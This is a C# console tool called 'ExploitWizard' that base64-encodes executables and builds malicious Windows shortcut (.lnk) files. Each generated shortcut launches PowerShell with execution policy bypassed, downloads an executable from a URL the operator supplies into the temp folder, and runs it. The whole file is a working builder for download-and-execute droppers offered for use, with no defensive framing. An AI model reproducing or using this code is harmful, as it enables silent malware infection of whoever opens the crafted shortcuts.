using System;
using Microsoft.Win32;
using System.IO;
using System.Text;
using System.Diagnostics;

namespace ExploitWizard
{
    class Program
    {
        static void Main(string[] args)
        {
            while (true)
            {
                Console.Clear();
                Console.WriteLine("Commands:");
                Console.WriteLine("encode");
                Console.WriteLine("lnk");
                Console.WriteLine("");
                Console.WriteLine("Enter Command : ");
                string command = Console.ReadLine();
                Console.Clear();
                Console.WriteLine("");

                switch (command.ToLower())
                {
                    default:
                        Console.WriteLine("Error: Unknown Command");
                        Console.ReadLine();
                        break;
                    case "exit":
                        return;
                    case "encode":
                        Console.WriteLine("Enter the path of the EXE file:");
                        string exePath = Console.ReadLine();
                        try
                        {
                            byte[] exeBytes = File.ReadAllBytes(exePath);
                            string b64String = Convert.ToBase64String(exeBytes);

                            File.WriteAllText(exePath + ".b64", b64String);
                            Console.WriteLine("EXE file successfully converted to .b64 file.");
                            Console.Beep();
                            Process.Start("explorer.exe", Path.GetDirectoryName(exePath));
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("Error: " + ex.Message);
                        }
                        break;
                    case "lnk":
                        Console.WriteLine("Enter The Direct URL For The https:\\\\payload.exe: ");
                        string lnk = Console.ReadLine();

                        Console.WriteLine("");
                        Console.WriteLine("Enter The Desired Name For The Dropped Payload: ");
                        string flnm = "%temp%\\" + Console.ReadLine() + ".exe";

                        Console.WriteLine("");
                        Console.WriteLine("Enter The Desired Name For The Exploit Shortcut File: ");
                        string exp = Console.ReadLine() + ".lnk";

                        string target = "C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
                        string arguments = " -NoProfile -ExecutionPolicy Bypass -command `Invoke-WebRequest -Uri " + lnk + " -OutFile " + flnm + ";Start-Process " + flnm;

                        IWshRuntimeLibrary.WshShell wshShell = new IWshRuntimeLibrary.WshShell();
                        IWshRuntimeLibrary.IWshShortcut shortcutFile = (IWshRuntimeLibrary.IWshShortcut)wshShell.CreateShortcut(exp);
                        shortcutFile.TargetPath = target;
                        shortcutFile.Arguments = arguments;
                        shortcutFile.Hotkey = "Ctrl+A";
                        shortcutFile.WindowStyle = 1;
                        shortcutFile.Save();
                        Console.Beep();
                        string shortcutFilePath = Path.Combine(Directory.GetCurrentDirectory(), exp);
                        Process.Start("explorer.exe", "/select," + shortcutFilePath);
                        break;
                }
            }
        }
    }
}